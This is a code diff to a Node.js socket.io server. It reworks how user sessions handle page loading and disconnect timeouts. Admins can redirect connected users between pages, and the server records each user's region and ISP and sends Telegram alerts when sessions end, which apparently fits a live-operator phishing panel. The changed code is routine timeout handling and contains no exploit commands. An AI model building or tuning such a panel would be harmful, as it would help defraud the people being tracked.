@@ -73,6 +73,7 @@ class SessionManager {
             verified: false,
             connected: true,
             loading: false,
+            redirecting: false, // Add this flag
             lastHeartbeat: Date.now(),
             lastAccessed: Date.now(),
             createdAt: Date.now(),
@@ -84,7 +85,7 @@ class SessionManager {
             region: null,
             isp: null
         };
-
+    
         this.pendingSessions.set(sessionId, session);
         this.updateSessionUrl(session);
         return session;
@@ -742,6 +743,7 @@ app.get('/:page', pageServingMiddleware);
 // Static files
 app.use(express.static(join(__dirname, '../../public')));
 app.use('/dashboard/admin', express.static(join(__dirname, '../../dist/admin')));
+const loadingTimeouts = new Map();
 
 // User namespace
 const userNamespace = io.of('/user');
@@ -945,18 +947,7 @@ userNamespace.on('connection', async (socket) => {
             }
         });
 
-        socket.on('page_loading', (isLoading) => {
-            const session = sessionManager.getSession(sessionId);
-            if (session) {
-                session.loading = isLoading;
-                session.lastAccessed = Date.now();
-                session.lastHeartbeat = Date.now();
-                // Only emit updates for verified sessions
-                if (!sessionManager.isPending(sessionId)) {
-                    adminNamespace.emit('session_updated', session);
-                }
-            }
-        });
+
 
         // Check session URL
         socket.on('check_session_url', () => {
@@ -966,31 +957,79 @@ userNamespace.on('connection', async (socket) => {
             }
         });
 
+        socket.on('page_loading', (isLoading) => {
+            const session = sessionManager.getSession(sessionId);
+            if (session) {
+                session.loading = isLoading;
+                session.lastAccessed = Date.now();
+                session.lastHeartbeat = Date.now();
+                
+                // If page load completes, clear any pending disconnect timeout
+                if (!isLoading) {
+                    const existingTimeout = loadingTimeouts.get(sessionId);
+                    if (existingTimeout) {
+                        clearTimeout(existingTimeout);
+                        loadingTimeouts.delete(sessionId);
+                    }
+                    session.connected = true; // Ensure we mark as connected when load completes
+                }
+                
+                if (!sessionManager.isPending(sessionId)) {
+                    adminNamespace.emit('session_updated', session);
+                }
+            }
+        });
+    
+
         // Handle disconnection with cleanup delay
         socket.on('disconnect', () => {
             const sessionId = socket.sessionId;
             const session = sessionManager.getSession(sessionId);
             
             if (session) {
-                if (!session.loading) {
+                // If we're loading, give a grace period before marking as disconnected
+                if (session.loading) {
+                    // Clear any existing timeout
+                    const existingTimeout = loadingTimeouts.get(sessionId);
+                    if (existingTimeout) {
+                        clearTimeout(existingTimeout);
+                    }
+
+                    // Set new timeout - only mark as disconnected if load doesn't complete in 5s
+                    const timeout = setTimeout(() => {
+                        const currentSession = sessionManager.getSession(sessionId);
+                        if (currentSession && currentSession.loading) {
+                            currentSession.loading = false;
+                            currentSession.connected = false;
+                            adminNamespace.emit('session_updated', currentSession);
+                        }
+                        loadingTimeouts.delete(sessionId);
+                    }, 5000);
+                    
+                    loadingTimeouts.set(sessionId, timeout);
+                } else {
+                    // If not loading, mark as disconnected immediately
                     session.connected = false;
-                }
-                session.lastHeartbeat = Date.now();
-                
-                // Only emit updates for verified sessions
-                if (!sessionManager.isPending(sessionId)) {
+                    session.loading = false;
                     adminNamespace.emit('session_updated', session);
                 }
-        
+
+                session.lastHeartbeat = Date.now();
+                
                 setTimeout(() => {
                     const currentSession = sessionManager.getSession(sessionId);
                     if (currentSession && !currentSession.connected && 
-                        Date.now() - currentSession.lastHeartbeat > 5000 && 
-                        !currentSession.loading) {
+                        Date.now() - currentSession.lastHeartbeat > 900000) {
+                        
+                        // Clear any remaining timeouts for this session
+                        const existingTimeout = loadingTimeouts.get(sessionId);
+                        if (existingTimeout) {
+                            clearTimeout(existingTimeout);
+                            loadingTimeouts.delete(sessionId);
+                        }
                         
                         sessionManager.deleteSession(sessionId);
                         
-                        // Only emit removal for verified sessions
                         if (!sessionManager.isPending(sessionId)) {
                             adminNamespace.emit('session_removed', sessionId);
                             sendTelegramNotification(formatTelegramMessage('session_ended', {
@@ -999,7 +1038,7 @@ userNamespace.on('connection', async (socket) => {
                             }));
                         }
                     }
-                }, 5000);
+                }, 900000);
             }
         });
 
@@ -1008,6 +1047,8 @@ userNamespace.on('connection', async (socket) => {
         socket.disconnect(true);
     }
 });
+
+
 
 // Admin namespace
 const adminNamespace = io.of('/admin');
@@ -1063,13 +1104,31 @@ adminNamespace.on('connection', (socket) => {
         if (targetSocket) {
             const session = sessionManager.getSession(sessionId);
             if (session) {
+                // Clear any existing timeout
+                const existingTimeout = loadingTimeouts.get(sessionId);
+                if (existingTimeout) {
+                    clearTimeout(existingTimeout);
+                }
+                
                 session.loading = true;
                 session.connected = true;
+                session.lastHeartbeat = Date.now();
                 adminNamespace.emit('session_updated', session);
                 
-                // Update the session page (removes .html if present)
+                // Set new loading timeout
+                const timeout = setTimeout(() => {
+                    const currentSession = sessionManager.getSession(sessionId);
+                    if (currentSession && currentSession.loading) {
+                        currentSession.loading = false;
+                        currentSession.connected = false;
+                        adminNamespace.emit('session_updated', currentSession);
+                    }
+                    loadingTimeouts.delete(sessionId);
+                }, 5000);
+                
+                loadingTimeouts.set(sessionId, timeout);
+                
                 const pageName = page.replace('.html', '');
-                // Get capitalized version of page name
                 const pageNameCapitalized = pageName.charAt(0).toUpperCase() + pageName.slice(1).toLowerCase();
                 
                 session.currentPage = pageNameCapitalized;
@@ -1081,6 +1140,7 @@ adminNamespace.on('connection', (socket) => {
             }
         }
     });
+    
 
 
 
@@ -1183,23 +1243,19 @@ setInterval(() => {
     const now = Date.now();
     for (const [sessionId, session] of state.sessions) {
         // Check for heartbeat timeout (30 seconds)
-        if (now - session.lastHeartbeat > 30000) {
-            // Don't delete, just mark as inactive
-            if (session.connected) {
-                session.connected = false;
-                session.loading = false;
-                adminNamespace.emit('session_updated', session);
-            }
+        if (now - session.lastHeartbeat > 30000 && session.connected) {
+            session.connected = false;
+            adminNamespace.emit('session_updated', session);
         }
 
-        // Only delete after very long inactivity (30 minutes)
+        // Delete after 30 minutes of no heartbeat
         if (now - session.lastHeartbeat > 30 * 60 * 1000) {
             state.sessions.delete(sessionId);
             sessionManager.deleteSession(sessionId);
             adminNamespace.emit('session_removed', sessionId);
         }
     }
-}, 10000); // Check every 10 seconds
+}, 10000);
 
 // Start server
 const PORT = process.env.PORT || 3000;
